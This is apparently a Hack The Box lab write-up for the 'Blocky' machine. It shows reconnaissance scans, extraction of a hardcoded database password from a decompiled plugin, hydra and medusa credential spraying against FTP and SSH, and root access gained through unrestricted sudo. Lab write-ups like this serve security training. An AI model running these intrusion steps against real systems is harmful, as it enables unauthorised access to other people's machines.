# Hackthebox Blocky

Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.

### Attack Summary

1. Hardcoded password
2. Overly permissive Sudo configuration


## Recon

### Service Discovey

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Fri Dec 28 09:54:49 2018 as: nmap -v -sV -p- -T4 -oA blocky_full 10.10.10.37
Nmap scan report for 10.10.10.37
Host is up (0.071s latency).
Not shown: 65530 filtered ports
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http      Apache httpd 2.4.18 ((Ubuntu))
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Checking the FTP and SSH services gave nothing.

Moving along there is a wordpress blog running on port 80. Let's throw wpscan on it:

```
root@kali:~/htb/blocky# wpscan --url http://10.10.10.37 --enumerate u -o blocky_wpscan
_______________________________________________________________                               
        __          _______   _____                                                             
        \ \        / /  __ \ / ____|                                                                       
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                                           
           \  /\  /  | |     ____) | (__| (_| | | | |                                         
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                  
                                                                       
        WordPress Security Scanner by the WPScan Team                                         
                       Version 3.4.1                                                            
          Sponsored by Sucuri - https://sucuri.net                                                                                                 
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_                         
_______________________________________________________________        
                                                                                              
[i] Updating the Database ...                                
[i] Update completed.                                                                      
                                                                                                  
[+] URL: http://10.10.10.37/                                                                  
[+] Started: Fri Dec 28 10:03:08 2018                                                                                       
                                                                                
Interesting Finding(s):                                                              
                                                                                                 
[+] http://10.10.10.37/                                                                
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)                  
 | Found By: Headers (Passive Detection)                                                       
 | Confidence: 100%                                                  
                                                                      
[+] http://10.10.10.37/xmlrpc.php                                         
 | Found By: Direct Access (Aggressive Detection)                      
 | Confidence: 100%                                                                           
 | References:                                                           
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                      
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos               
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login           
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
                                                                                                                                                                                             
[+] http://10.10.10.37/readme.html                                                                      
 | Found By: Direct Access (Aggressive Detection)                                                  
 | Confidence: 100%                                                                     
                                                                                                                               
[+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Detected By: Rss Generator (Passive Detection)
 |  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |
 | [!] 25 vulnerabilities identified:
 |
 | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
 |     Fixed in: 4.8.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8905
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
 |      - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
 |
 | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
 |     Fixed in: 4.8.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8910
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41398
 |
 | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
 |     Fixed in: 4.8.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8911
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41457
 |
 | [!] Title: WordPress 4.4-4.8.1 - Path Traversal in Customizer
 |     Fixed in: 4.8.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8912
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41397
 |
 | [!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed
 |     Fixed in: 4.8.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8913
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41448
 |
 | [!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor
 |     Fixed in: 4.8.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8914
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41395
 |      - https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html
 |
 | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8807
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
 |      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
 |      - http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
 |      - https://core.trac.wordpress.org/ticket/25239
 ...

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
 | Last Updated: 2018-12-19T00:00:00.000Z
 | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 1.9
 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating Users
 Brute Forcing Author IDs - Time: 00:00:00 <==========================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] notch
 | Detected By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Detected By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Finished: Fri Dec 28 10:03:13 2018
[+] Requests Done: 71
[+] Cached Requests: 6
[+] Data Sent: 12.834 KB
[+] Data Received: 20.095 MB
[+] Memory used: 88 KB
[+] Elapsed time: 00:00:05
```
We found a user called notch.

### Content Discovery 

Lets do some content discovery with gobuster:

```
root@kali:~/htb/blocky# gobuster -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://10.10.10.37                                                               

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.37/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/12/28 10:12:45 Starting gobuster
=====================================================
/wp-content (Status: 301)
/wp-admin (Status: 301)
/wp-includes (Status: 301)
/plugins (Status: 301)
/javascript (Status: 301)
/wiki (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
=====================================================
2018/12/28 10:20:44 Finished
=====================================================
```

We found some login portals:

- http://10.10.10.37/phpmyadmin/
- http://10.10.10.37/wp-login.php

And we found a plugins directory containing two jar files. 

To decompile the jar files we can first unzip them, then use a tool called jad and run that on the class file.

Looking though the decompiled files I found the following in "BlockyCore"

```
public BlockyCore()
    {
        sqlHost = "localhost";
        sqlUser = "root";
        sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```


## Initial Compromise


So we now have a password and some potential usernames like "root", "admin" and "notch". So next I just tried these combinations against all the services (ftp, ssh, Wordpress, PhpMyadmin).

And I got a hit on both FTP and  SSH using the notch user and that password.

```
root@kali:~/htb/blocky# hydra -L users.txt -P password.txt -f -o ftphydra.txt -u 10.10.10.37 -s 21 ftp
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-28 11:18:24
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:3/p:1), ~1 try per task
[DATA] attacking ftp://10.10.10.37:21/
[21][ftp] host: 10.10.10.37   login: notch   password: 8YsqfCTnvxAUeduzjNSXe22
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-12-28 11:18:25
```

The ftp server gives us acces directly to the users home directory. So here we could just upload our public ssh key to be able to log in using SSH without any password.

But as we see below we could just simply login with the password we found as well.

```
root@kali:~/htb/blocky# medusa -U users.txt -P password.txt -e ns -h 10.10.10.37 - 22 -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 10.10.10.37 (1 of 1, 0 complete) User: root (1 of 3, 0 complete) Password:  (1 of 3 complete)                                                                               
ACCOUNT CHECK: [ssh] Host: 10.10.10.37 (1 of 1, 0 complete) User: root (1 of 3, 0 complete) Password: root (2 of 3 complete)                                                                           
ACCOUNT CHECK: [ssh] Host: 10.10.10.37 (1 of 1, 0 complete) User: root (1 of 3, 0 complete) Password: 8YsqfCTnvxAUeduzjNSXe22 (3 of 3 complete)                                                        
ACCOUNT CHECK: [ssh] Host: 10.10.10.37 (1 of 1, 0 complete) User: admin (2 of 3, 1 complete) Password:  (1 of 3 complete)                                                                              
ACCOUNT CHECK: [ssh] Host: 10.10.10.37 (1 of 1, 0 complete) User: admin (2 of 3, 1 complete) Password: admin (2 of 3 complete)                                                                         
ACCOUNT CHECK: [ssh] Host: 10.10.10.37 (1 of 1, 0 complete) User: admin (2 of 3, 1 complete) Password: 8YsqfCTnvxAUeduzjNSXe22 (3 of 3 complete)                                                       
ACCOUNT CHECK: [ssh] Host: 10.10.10.37 (1 of 1, 0 complete) User: notch (3 of 3, 2 complete) Password:  (1 of 3 complete)                                                                              
ACCOUNT CHECK: [ssh] Host: 10.10.10.37 (1 of 1, 0 complete) User: notch (3 of 3, 2 complete) Password: notch (2 of 3 complete)                                                                         
ACCOUNT CHECK: [ssh] Host: 10.10.10.37 (1 of 1, 0 complete) User: notch (3 of 3, 2 complete) Password: 8YsqfCTnvxAUeduzjNSXe22 (3 of 3 complete)                                                       
ACCOUNT FOUND: [ssh] Host: 10.10.10.37 User: notch Password: 8YsqfCTnvxAUeduzjNSXe22 [SUCCESS]
```

## Pivilege Escalation

A typical Linux privilege escalation method is based on one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process. 

There are several scripts that automates this process for us.

So I go to /dev/shm and upload a privsc script called LinEnum.

Going through all the output of that script we see the following interesting stuff:

```
[+] We're a member of the (lxd) group - could possibly misuse these rights!
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)       
```
Also I noticed that there was no sudo information from the scipt, lets run that manually.

We can list our sudo rights with sudo -l. We need to specify our password to list these, this is probably why the script failed to do so.

```
notch@Blocky:/dev/shm$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

So we have SUDO rights to all the commands on the host. So we can simply just sudo to the root user.

```
notch@Blocky:/dev/shm$ sudo su
root@Blocky:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
root@Blocky:/dev/shm# 
```
